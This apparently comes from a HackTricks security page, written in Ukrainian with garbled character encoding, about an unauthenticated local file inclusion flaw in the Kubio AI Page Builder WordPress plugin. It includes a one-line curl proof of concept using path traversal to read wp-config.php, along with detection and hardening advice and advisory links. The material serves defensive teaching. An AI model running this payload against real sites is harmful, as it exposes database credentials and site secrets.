–ü—Ä–∏–π–æ–º —à–ª—è—Ö—ñ–≤, –∫–µ—Ä–æ–≤–∞–Ω–∏—Ö –∞—Ç–∞–∫—É—é—á–∏–º, —É –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ —à–∞–±–ª–æ–Ω—É –±–µ–∑ –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—ó/–æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î —á–∏—Ç–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –ª–æ–∫–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏, –∞ —ñ–Ω–æ–¥—ñ ‚Äî –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥, —è–∫—â–æ —Ñ–∞–π–ª–∏ PHP –∞–±–æ –ª–æ–≥-—Ñ–∞–π–ª–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏, –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å —É —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: –≤—ñ–¥—Å—É—Ç–Ω—è –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—è/—Å–ø–∏—Å–æ–∫ –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å; traversal permitted
- Impact: —Ä–æ–∑–≥–æ–ª–æ—à–µ–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ (wp-config.php), –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π RCE –≤ –ø–µ–≤–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö (log poisoning, includable PHP)

PoC ‚Äì –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è
- –ë—É–¥—å-—è–∫–∏–π –æ–±—Ä–æ–±–Ω–∏–∫, —â–æ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î —à–ª—è—Ö–∏ –∑–∞–ø–∏—Ç—ñ–≤ —É include()/require()/read sinks –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —á–µ—Ä–µ–∑ realpath()
- –®—É–∫–∞–π—Ç–µ traversal-–ø–∞—Ç–µ—Ä–Ω–∏ (../), —è–∫—ñ –≤–∏—Ö–æ–¥—è—Ç—å –∑–∞ –º–µ–∂—ñ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó —à–∞–±–ª–æ–Ω—ñ–≤

–ó–º—ñ—Ü–Ω–µ–Ω–Ω—è –∑–∞—Ö–∏—Å—Ç—É
- –ó–∞—Å—Ç–æ—Å–æ–≤—É–π—Ç–µ allowlisted —à–∞–±–ª–æ–Ω–∏; —Ä–µ–∑–æ–ª–≤—ñ—Ç—å —á–µ—Ä–µ–∑ realpath() —ñ –≤–∏–º–∞–≥–∞–π—Ç–µ str_starts_with(realpath(file), realpath(allowed_base))
- –ù–æ—Ä–º–∞–ª—ñ–∑—É–π—Ç–µ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ; –≤—ñ–¥–∫–∏–¥–∞–π—Ç–µ traversal-–ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —Ç–∞ –∞–±—Å–æ–ª—é—Ç–Ω—ñ —à–ª—è—Ö–∏; –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ sanitize_file_name() –ª–∏—à–µ –¥–ª—è —ñ–º–µ–Ω —Ñ–∞–π–ª—ñ–≤ (–Ω–µ –¥–ª—è –ø–æ–≤–Ω–∏—Ö —à–ª—è—Ö—ñ–≤)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
